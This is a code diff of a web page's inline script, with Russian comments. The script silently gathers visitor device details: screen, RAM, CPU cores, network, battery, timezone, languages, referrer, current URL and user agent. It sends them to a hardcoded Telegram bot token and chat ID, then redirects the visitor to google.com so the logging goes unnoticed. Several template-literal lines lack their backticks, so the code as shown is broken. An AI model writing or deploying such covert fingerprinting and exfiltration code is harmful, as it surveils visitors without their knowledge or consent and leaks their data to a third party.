@@ -11,27 +11,68 @@
         const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
         const CHAT_ID = "8814781494";
 
-        // Собираем базовую информацию без внешних запросов, которые могут блокироваться
-        const info = "🚨 Новый посетитель на сайте!\n\n" +
-                     "⏱ Время: " + new Date().toLocaleString() + "\n" +
-                     "💻 Платформа: " + navigator.platform + "\n" +
-                     "🗣 Язык: " + navigator.language + "\n" +
-                     "📺 Экран: " + window.screen.width + "x" + window.screen.height + "\n" +
-                     "🧠 Память (RAM): " + (navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно") + "\n" +
-                     "⚙️ Ядра процессора: " + (navigator.hardwareConcurrency || "неизвестно") + "\n" +
-                     "🔗 Источник: " + (document.referrer || "прямой заход") + "\n" +
-                     "📱 User-Agent: " + navigator.userAgent;
+        async function gatherInfo() {
+            // Базовые метрики экрана
+            const screenInfo = ${window.screen.width}x${window.screen.height} (Цветов: ${window.screen.colorDepth}, Пикселей: ${window.screen.pixelDepth});
+            const windowInfo = ${window.innerWidth}x${window.innerHeight};
 
-        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info);
+            // Сеть (если поддерживается)
+            let connectionInfo = "недоступно";
+            if (navigator.connection) {
+                connectionInfo = Тип: ${navigator.connection.effectiveType || 'н/д'}, Скорость: ${navigator.connection.downlink || 'н/д'} Мбит/с, RTT: ${navigator.connection.rtt || 'н/д'}ms;
+            }
 
-        // Отправляем запрос в Telegram, но НЕ ждем его завершения для редиректа,
-        // чтобы страница не зависала, если Telegram или сеть заблокированы.
-        fetch(url).catch(function() {});
+            // Данные батареи (если поддерживается)
+            let batteryInfo = "недоступно";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = ${Math.round(battery.level * 100)}% (${battery.charging ? 'заряжается' : 'разряжается'});
+                } catch (e) {}
+            }
 
-        // Перенаправление на целевой сайт через 500 миллисекунд
+            // Поддерживаемые языки
+            const languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
+
+            // Часовой пояс
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "неизвестно";
+
+            // Доступная память и процессор
+            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно";
+            const cores = navigator.hardwareConcurrency || "неизвестно";
+
+            // Оценка железа по производительности задержки кадров (примерная)
+            const touchPoints = navigator.maxTouchPoints || 0;
+
+            const info = "🚨 Подробный отчет о посетителе\n\n" +
+                         "⏱ Время: " + new Date().toLocaleString() + "\n" +
+                         "🌍 Часовой пояс: " + timezone + "\n" +
+                         "💻 Платформа / ОС: " + navigator.platform + "\n" +
+                         "🗣 Языки: " + languages + "\n" +
+                         "📺 Экран (физ.): " + screenInfo + "\n" +
+                         "🪟 Окно браузера: " + windowInfo + "\n" +
+                         "👆 Точки касания (Тач): " + touchPoints + "\n" +
+                         "🧠 Память (RAM): " + ram + "\n" +
+                         "⚙️ Ядра процессора: " + cores + "\n" +
+                         "📶 Сеть: " + connectionInfo + "\n" +
+                         "🔋 Батарея: " + batteryInfo + "\n" +
+                         "🔗 Источник (Referrer): " + (document.referrer || "прямой заход") + "\n" +
+                         "📌 Текущий адрес: " + window.location.href + "\n" +
+                         "📱 User-Agent: " + navigator.userAgent;
+
+            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info) + "&parse_mode=Markdown";
+
+            // Отправляем в фоне
+            fetch(url).catch(function() {});
+        }
+
+        // Запускаем сбор и сразу ставим таймер на редирект (0.6 сек), 
+        // чтобы асинхронные запросы (например, батарея) успели выполниться в фоне, но юзер не ждал долго.
+        gatherInfo();
+
         setTimeout(function() {
             window.location.href = "https://google.com";
-        }, 500);
+        }, 600);
     </script>
 </body>
 </html>
